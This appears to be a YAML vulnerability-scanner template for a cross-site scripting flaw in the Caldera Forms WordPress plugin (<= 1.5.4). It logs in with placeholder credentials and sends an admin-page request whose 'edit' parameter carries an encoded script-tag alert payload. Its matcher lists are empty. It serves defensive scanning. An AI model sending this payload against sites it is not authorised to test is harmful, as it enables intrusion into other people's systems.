id: wp-caldera-forms-xss
brief:
    title: Caldera Forms <= 1.5.4 - Cross-Site Scripting
    by: theamanrawat
    level: medium
    about: The Caldera Forms WordPress plugin before 1.5.4 is affected by an cross-site scripting (XSS) vulnerability. Due to insufficient input sanitization and output escaping, attackers can inject arbitrar...
    label:
        - wordpress
        - wp
        - wp-plugin
        - caldera-forms
        - xss
        - vuln
        - wpscan
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=caldera-forms&edit=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
      signs: []
